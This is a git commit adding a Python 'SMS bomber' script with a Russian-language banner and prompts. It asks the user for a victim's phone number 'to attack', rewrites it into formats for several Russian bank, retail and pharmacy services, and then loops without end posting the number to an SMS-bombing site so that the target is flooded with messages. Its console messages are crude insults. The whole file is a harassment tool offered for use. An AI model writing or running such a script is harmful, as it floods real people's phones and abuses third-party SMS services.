e8ddd17835894f445df039368e8170a6ce5e47f7
pkgsearch <73498800+pkgsearch@users.noreply.github.com>
2020-11-13 21:56:27 +0300

    Create main.py

---
+++ main.py
@@ -0,0 +1,53 @@
+
+import requests, random, datetime, sys, time, os
+
+from colorama import Fore, Back, Style
+from termcolor import colored
+
+c = 'clear'
+os.system(c)
+
+banner = colored("""
+RRRRRR.          I.            PPPPPP.          
+R    R.          I.            P.   P
+R    R.          I.            P.   P
+R RRRRR.         I.            PPPPPP
+RR.              I.            P
+R.  R.           I             P. 
+R.    R.         I             P
+R.       R.      I             P
+   Автор @pkgsearch 
+""", "red")
+
+print(banner)
+_phone = input('Привет боец! Введите номер для атаки +')
+if _phone[0] == '+':
+	_phone = _phone[1:]
+if _phone[0] == '8':
+	_phone = '7'+_phone[1:]
+if _phone[0] == '9':
+	_phone = '7'+_phone
+
+_name = ''
+for x in range(12):
+	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
+	passmegafon = random.choice(list('123456789'))
+
+_phone9 = _phone[1:]
+_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
+_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
+_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
+_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
+_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
+
+iteration = 0
+while True:
+	_email = _name+f'{iteration}'+'@gmail.com'
+	email = _name+f'{iteration}'+'@gmail.com'
+	try:
+		requests.post('https://smsbomber.online/', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
+		print(Fore.GREEN + 'Ты успешно уебал говноеда.')
+	except:
+		print(Fore.RED + 'Ты получил в клитор!')
